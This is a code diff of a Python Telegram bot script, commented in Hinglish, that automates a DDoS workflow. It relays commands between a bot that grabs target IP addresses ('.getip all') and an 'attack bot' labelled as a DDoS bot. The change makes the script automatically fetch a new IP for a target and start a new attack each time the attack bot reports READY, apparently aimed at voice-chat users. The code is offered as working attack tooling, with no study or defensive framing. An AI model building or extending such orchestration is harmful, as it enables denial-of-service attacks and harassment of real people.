@@ -36,9 +36,6 @@ BOT_B_ID = None
 # keys: armed, bot_ready, running, current_cmd, pending_cmd, target
 chat_state: dict[int, dict] = {}
 
-# last CMD jo BOT_A se aaya (safety ke liye)
-last_cmd: str | None = None
-
 
 # --------------- FSM HELPERS ---------------
 
@@ -91,8 +88,8 @@ async def cancel_task(cid: int):
 
 @tele.on(events.NewMessage)
 async def tele_listener(event):
-    """BOT_A ke CMD aur BOT_B ke READY / STATUS / ATTACK messages handle karta hai."""
-    global BOT_A_ID, BOT_B_ID, last_cmd
+    """BOT_A ke CMD aur BOT_B ke READY messages handle karta hai."""
+    global BOT_A_ID, BOT_B_ID
 
     sender = await event.get_sender()
     if not sender:
@@ -114,7 +111,6 @@ async def tele_listener(event):
         cmd = cmd.replace("**", "").replace("`", "").strip()
 
         print("✅ FINAL CMD:", cmd)
-        last_cmd = cmd
 
         # sab chats jaha FSM armed hai
         for cid, state in chat_state.items():
@@ -138,14 +134,14 @@ async def tele_listener(event):
                 print(f"[FSM {cid}] Idle -> pending set, try_execute (if READY).")
                 await try_execute(cid)
 
-    # ------------ BOT B (attack bot / READY or ATTACK status) ------------
+    # ------------ BOT B (attack bot / READY status) ------------
     if BOT_B_ID is not None and sender_id == BOT_B_ID:
         low = text.lower()
         print("DDOS BOT MSG:", repr(text))
 
         # READY message (no attack running)
         is_ready = (
-            "*ʀᴇᴀᴅʏ**" in text
+            "ʀᴇᴀᴅʏ" in text
             or "ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ" in text
             or "ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ" in text
             or "no attack running" in low
@@ -155,18 +151,27 @@ async def tele_listener(event):
         if not is_ready:
             return
 
-        # READY milte hi, har armed chat ke liye bot_ready true karo
+        # READY milte hi, har armed chat ke liye:
         for cid, state in chat_state.items():
             if not state["armed"]:
                 continue
 
-            # agar pending_cmd empty hai aur last_cmd available hai, use set karo
-            if not state["pending_cmd"] and last_cmd and state.get("target"):
-                state["pending_cmd"] = last_cmd
-                print(f"[FSM {cid}] READY -> set pending_cmd from last_cmd: {last_cmd}")
-
             state["bot_ready"] = True
-            await try_execute(cid)
+
+            if state.get("pending_cmd"):
+                # agar queue me CMD hai to turant chalao
+                await try_execute(cid)
+            else:
+                # warna naya IP mang lo (VC end → fresh CMD)
+                target = state.get("target")
+                if not target:
+                    continue
+                msg = f".getip all {target}"
+                print(f"[FSM {cid}] READY -> AUTO SEND to BOT_A:", msg)
+                try:
+                    await tele.send_message(BOT_A_ID, msg)
+                except Exception as e:
+                    print(f"[FSM {cid}] ERROR sending to BOT_A on READY:", repr(e))
 
 
 # --------------- PTB COMMAND HANDLERS ---------------
@@ -221,8 +226,9 @@ async def cmd_startfsm(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         '''✅ Event-driven mode ON.
         • /setlinkchatid se target set karo.
-        • BOT_A (.getip) se jo CMD aayega wo auto parse hoga.q
+        • BOT_A (.getip) se jo CMD aayega wo auto parse hoga.
         • BOT_B READY hote hi pending attack auto start hoga.
+        • VC end hone par READY → naya .getip all → auto new attack.
         • Naya CMD aane par purana auto /stop + naya start.'''
     )
 
